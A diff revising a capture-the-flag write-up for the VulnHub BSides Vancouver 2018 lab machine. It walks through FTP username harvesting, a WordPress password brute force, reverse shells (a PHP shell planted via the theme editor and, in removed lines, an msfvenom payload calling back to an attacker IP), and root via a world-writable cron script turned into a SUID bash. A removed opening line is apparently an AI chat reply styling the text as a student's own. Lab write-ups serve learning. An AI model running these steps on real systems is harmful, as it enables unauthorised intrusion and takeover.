@@ -1,139 +1,132 @@
-My bad! I got carried away with the instructions. Here is the report in **English**, written in a concise, "no-fluff" style that real pentest students use for their GitHub writeups.
-# Writeup: BSides Vancouver 2018 (VulnHub)
+# Writeup: BSides Vancouver 2018 (Workshop)
 
-* **Date:** January 2026
 * **Target IP:** 192.168.56.112
-* **Difficulty:** Beginner / Easy
-* **Goal:** Boot-to-Root (Capture the flag in `/root`)
+* **Attacker IP:** 192.168.56.102
+* **Difficulty:** Beginner
+* **Flag:** `/root/flag.txt`
 
 ---
 
 ## 1. Reconnaissance & Enumeration
 
-### Port Scanning
+### Service Scanning
 
-I started with a standard `nmap` scan to identify open ports and services:
+A full `nmap` scan revealed three open ports:
 
-```bash
-nmap -p- -A 192.168.56.112 --open
+* **21 (FTP):** vsftpd 2.3.5 (Anonymous allowed).
+* **22 (SSH):** OpenSSH 5.9p1.
+* **80 (HTTP):** Apache 2.2.22.
 
-```
+### Credential Harvesting
 
-**Key findings:**
+1. **FTP:** Accessed via anonymous login. Downloaded `users.txt.bk`, which provided a list of usernames: `abatchy`, `john`, `mai`, `anne`, `doomguy`.
+2. **WordPress:** Located at `/backup_wordpress/`.
+3. **WPScan:** Performed a brute-force attack using the FTP username list and `rockyou.txt`.
+* **Result:** `john : enigma`
 
-* **Port 21 (FTP):** Anonymous login is enabled.
-* **Port 22 (SSH):** Open (useful if we find credentials).
-* **Port 80 (HTTP):** Running Apache. Nmap also hinted at a `/backup_wordpress` directory.
 
-### FTP Enumeration
-
-Logging in as `anonymous` allowed me to download a file named `user.txt.bk`. This file contained a list of potential usernames:
-
-* `abatchy`, `john`, `mai`, `anne`, `doomguy`
-
-### Web Enumeration
-
-Navigating to `http://192.168.56.112/backup_wordpress` confirmed a WordPress installation. I used `wpscan` to enumerate users:
-
-```bash
-wpscan --url http://192.168.56.112/backup_wordpress/ --enumerate u
-
-```
-
-Confirmed users: `admin`, `john`.
 
 ---
 
-## 2. Gaining Access
+## 2. Exploitation (Initial Access)
 
-### Password Brute Force
+I bypassed automated exploits and used the **WordPress Theme Editor** for manual code execution:
 
-Since I had the username `john`, I ran a dictionary attack using `rockyou.txt`:
+1. Log in to the dashboard as `john`.
+2. Edit `Appearance > Editor > 404.php` (Twenty Fourteen theme).
+3. Injected a [Pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) configured to my IP and port 1234.
+4. Triggered the shell via browser.
+
+### Post-Exploitation Commands (The Breakdown)
+
+Once the connection was caught with `nc -lvnp 1234`, the following stabilization and enumeration steps were taken:
+
+#### A. Shell Stabilization (TTY Upgrade)
 
 ```bash
-wpscan --url http://192.168.56.112/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt
+python -c 'import pty; pty.spawn("/bin/bash")'
+# [Ctrl+Z]
+stty raw -echo; fg
 
 ```
 
-**Credentials Found:** `john : enigma`
+* **Why:** Initial shells are "dumb"—they lack Tab-completion, job control, and text editors (like nano) break them.
+* **How it works:** Python spawns a pseudo-terminal (PTY). The `stty` command tells my local machine to pass raw keyboard input directly to the target, and `fg` brings the session back to the foreground with full functionality.
 
-### Initial Shell
+#### B. System Enumeration
 
-With admin access to WordPress, I used Metasploit's `wp_admin_shell_upload` module to get a Meterpreter session:
-
+1. **Database Discovery:**
 ```bash
-use exploit/unix/webapp/wp_admin_shell_upload
-set RHOSTS 192.168.56.112
-set TARGETURI /backup_wordpress
-set USERNAME john
-set PASSWORD enigma
-exploit
+cat /var/www/backup_wordpress/wp-config.php | grep 'DB_PASSWORD'
 
 ```
 
-Session opened successfully.
+
+* **Result:** Found `thiscannotbeit`. I tested this password for users `john` and `abatchy`, but access was denied.
+
+
+2. **SUID Search:**
+```bash
+find / -perm -u=s -type f 2>/dev/null
+
+```
+
+
+* **Why:** I checked for binaries that run with root privileges. Found `pkexec` and `sudo`, but looked for an easier vector first.
+
+
 
 ---
 
 ## 3. Privilege Escalation
 
-### System Analysis
+### Vector Identification
 
-While checking the system configuration, I looked at the `/etc/crontab` and noticed a recurring task running as **root**:
+Checking the system-wide crontab:
 
-* Script: `/usr/local/bin/cleanup`
+```bash
+cat /etc/crontab
 
-The script had weak permissions, allowing me to modify it.
+```
+
+Identified a cronjob running as root: `* * * * * root /usr/local/bin/cleanup`.
+Verification of file permissions:
+
+```bash
+ls -l /usr/local/bin/cleanup # Result: -rwxrwxrwx
+
+```
+
+The script was **world-writable (777)**, a critical misconfiguration.
 
 ### Exploitation
 
-I decided to replace the contents of the `cleanup` script with a Python reverse shell payload.
+I injected a payload into the cleanup script to create a SUID bash binary:
 
-1. **Generate Payload:**
 ```bash
-msfvenom -p cmd/unix/reverse_python lhost=192.168.56.101 lport=9876 R
+echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /usr/local/bin/cleanup
 
 ```
 
+* **`cp /bin/bash /tmp/rootbash`**: Copies the shell to a writable directory.
+* **`chmod +s`**: Sets the SUID bit, meaning the file will run as its owner (root).
 
-2. **Upload & Replace:** I modified the local version of the script and uploaded it back to the target:
+Wait 60 seconds for the cronjob, then execute:
+
 ```bash
-meterpreter > upload /home/user/Desktop/cleanup /usr/local/bin/cleanup
+/tmp/rootbash -p
 
 ```
 
-
-3. **Catching the Shell:**
-I started a netcat listener on my machine:
-```bash
-nc -lvp 9876
-
-```
-
-
-
-After about a minute, the cron job executed, giving me a shell with root privileges.
+* **`-p`**: Essential flag to prevent Bash from dropping its effective root privileges.
 
 ---
 
-## 4. Loot
+## 4. Final Flag
 
-Final step was to grab the flag:
+Successfully obtained root access and read the flag:
 
 ```bash
-id
-# uid=0(root) gid=0(root) groups=0(root)
-
 cat /root/flag.txt
 
 ```
-
----
-
-### Summary
-
-The machine was compromised due to:
-
-1. **Information Leakage:** FTP anonymous access providing a username list.
-2. **Weak Credentials:** WordPress user had a password easily found in `rockyou.txt`.
-3. **Misconfigured Cron Job:** A root-level script was world-writable.
